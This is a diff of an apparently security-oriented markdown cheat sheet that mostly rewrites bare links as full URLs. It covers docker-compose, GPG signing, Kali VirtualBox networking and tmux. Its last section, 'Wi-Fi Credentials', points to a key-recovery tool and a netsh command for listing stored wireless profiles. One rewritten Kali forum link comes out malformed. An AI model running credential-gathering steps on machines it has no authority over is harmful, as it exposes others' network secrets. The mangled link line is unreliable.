+* [https://eyesaas.com/wi-fi-signal-strength/](https://eyesaas.com/wi-fi-signal-strength/)
 
 
 
@@ -5551,7 +5551,7 @@ relogin
 
 #### docker-compose
 
-* [docs.docker.com/compose/install/#install-compose-on-linux-systems](https://docs.docker.com/compose/install/#install-compose-on-linux-systems)
+* [https://docs.docker.com/compose/install/#install-compose-on-linux-systems](https://docs.docker.com/compose/install/#install-compose-on-linux-systems)
 
 ```
 $ sudo curl -L "https://github.com/docker/compose/releases/download/1.27.4/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
@@ -5808,8 +5808,8 @@ $ gpg -o/--output decrypted.txt -d/--decrypt -u/--local-user user1@example.com -
 
 ## Signing Git Commits
 
-* [www.youtube.com/watch?v=1vVIpIvboSg](https://www.youtube.com/watch?v=1vVIpIvboSg)
-* [www.youtube.com/watch?v=4166ExAnxmo](https://www.youtube.com/watch?v=4166ExAnxmo)
+* [https://www.youtube.com/watch?v=1vVIpIvboSg](https://www.youtube.com/watch?v=1vVIpIvboSg)
+* [https://www.youtube.com/watch?v=4166ExAnxmo](https://www.youtube.com/watch?v=4166ExAnxmo)
 
 Cache passphrase in gpg agent (dirty):
 
@@ -5989,8 +5989,8 @@ Mix settings list (both for hardware install and virtualization):
 
 Known issues:
 
-* [forums.virtualbox.org/viewtopic.php?f=3&t=96087](https://forums.virtualbox.org/viewtopic.php?f=3&t=96087)
-* [www.ceos3c.com/hacking/kali-linux-2020-1-virtualbox-shared-clipboard-stopped-working-fixed/](https://www.ceos3c.com/hacking/kali-linux-2020-1-virtualbox-shared-clipboard-stopped-working-fixed/)
+* [https://forums.virtualbox.org/viewtopic.php?f=3&t=96087](https://forums.virtualbox.org/viewtopic.php?f=3&t=96087)
+* [https://www.ceos3c.com/hacking/kali-linux-2020-1-virtualbox-shared-clipboard-stopped-working-fixed/](https://www.ceos3c.com/hacking/kali-linux-2020-1-virtualbox-shared-clipboard-stopped-working-fixed/)
 
 
 
@@ -6028,11 +6028,11 @@ $ ifup eth1
 $ ifup eth2
 ```
 
-* [unix.stackexchange.com/questions/37122/virtualbox-two-network-interfaces-nat-and-host-only-ones-in-a-debian-guest-on](https://unix.stackexchange.com/questions/37122/virtualbox-two-network-interfaces-nat-and-host-only-ones-in-a-debian-guest-on)
-* [kali.training/topic/configuring-the-network/](https://kali.training/topic/configuring-the-network/)
-* [www.blackmoreops.com/2013/11/25/how-to-fix-wired-network-interface-device-not-managed-error/](https://www.blackmoreops.com/2013/11/25/how-to-fix-wired-network-interface-device-not-managed-error/)
-* [www.virtualbox.org/manual/ch06.html](https://www.virtualbox.org/manual/ch06.html)
-* [forums.kali.org/showthread.php?29657-Only-one-of-multiple-wired-interfaces-(eth0-eth1-etc)-can-be-active-at-a-time](https://forums.kali.org/showthread.php?29657-Only-one-of-multiple-wired-interfaces-(eth0-eth1-etc)-can-be-active-at-a-time)
+* [https://unix.stackexchange.com/questions/37122/virtualbox-two-network-interfaces-nat-and-host-only-ones-in-a-debian-guest-on](https://unix.stackexchange.com/questions/37122/virtualbox-two-network-interfaces-nat-and-host-only-ones-in-a-debian-guest-on)
+* [https://kali.training/topic/configuring-the-network/](https://kali.training/topic/configuring-the-network/)
+* [https://www.blackmoreops.com/2013/11/25/how-to-fix-wired-network-interface-device-not-managed-error/](https://www.blackmoreops.com/2013/11/25/how-to-fix-wired-network-interface-device-not-managed-error/)
+* [https://www.virtualbox.org/manual/ch06.html](https://www.virtualbox.org/manual/ch06.html)
+* [eth0-eth1-etc)-can-be-active-at-a-time]://forums.kali.org/showthread.php?29657-Only-one-of-multiple-wired-interfaces-(eth0-eth1-etc)-can-be-active-at-a-time](https://forums.kali.org/showthread.php?29657-Only-one-of-multiple-wired-interfaces-(eth0-eth1-etc)-can-be-active-at-a-time)
 
 
 
@@ -6629,7 +6629,7 @@ $ script tool-$(date "+%FT%H%M%S").script
 
 ### tmux
 
-* [github.com/tmux-plugins/tmux-logging](https://github.com/tmux-plugins/tmux-logging)
+* [https://github.com/tmux-plugins/tmux-logging](https://github.com/tmux-plugins/tmux-logging)
 
 ```
 bash ~/.tmux/plugins/tmux-logging/scripts/screen_capture.sh
@@ -6787,7 +6787,7 @@ Cmd > mklink /D Link <DIRECTORY>
 
 ## Wi-Fi Credentials
 
-* [www.nirsoft.net/utils/wireless_key.html#DownloadLinks](https://www.nirsoft.net/utils/wireless_key.html#DownloadLinks)
+* [https://www.nirsoft.net/utils/wireless_key.html#DownloadLinks](https://www.nirsoft.net/utils/wireless_key.html#DownloadLinks)
 
 ```
 > netsh wlan show profiles
